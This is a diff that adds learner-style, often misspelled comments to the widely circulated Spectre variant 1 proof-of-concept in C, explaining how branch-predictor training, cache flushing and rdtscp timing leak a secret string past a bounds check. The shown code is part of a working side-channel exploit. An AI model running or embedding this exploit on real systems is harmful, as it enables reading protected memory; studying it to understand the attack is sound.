@@ -39,10 +39,12 @@ uint8_t array2[256 * 512];
 char * secret = "The password is rootkea";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
-
+/* we flushed array1_size so it will wont to speculate instead of waiting also flushed array2 so nothing will be loaded at cache*/
 void victim_function(size_t x) {
   if (x < array1_size) {
     temp &= array2[array1[x] * 512];
+    /* x was larger and array1[x] returned the first byte of secret*/
+    /* array2[secret[0]] is loaded to chache then our malicous prog can identify this*/
   }
 }
 
@@ -68,11 +70,15 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
+    /* try the malicous addres but also none maliucos so the BTB wont change*/
     training_x = tries % array1_size;
     for (j = 29; j >= 0; j--) {
       _mm_clflush( & array1_size);
-      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */ 
 
+
+
+      /*choosinbg between the malicous address and training addres*/
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
       /* Avoid jumps in case those tip off the branch predictor */
       x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
@@ -85,19 +91,20 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     }
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
+    /*where something was loaded in array2?*/
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
-      addr = & array2[mix_i * 512];
+      addr = & array2[mix_i * 512]; /*goes to array2 gets the mix_i * 512 element then gets its addres*/
       time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])/*it something malicous on the cache*/
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
     /* Locate highest & second-highest results results tallies in j/k */
     j = k = -1;
-    for (i = 0; i < 256; i++) {
+    for (i = 0; i < 256; i++) {/* Find top two results */
       if (j < 0 || results[i] >= results[j]) {
         k = j;
         j = i;
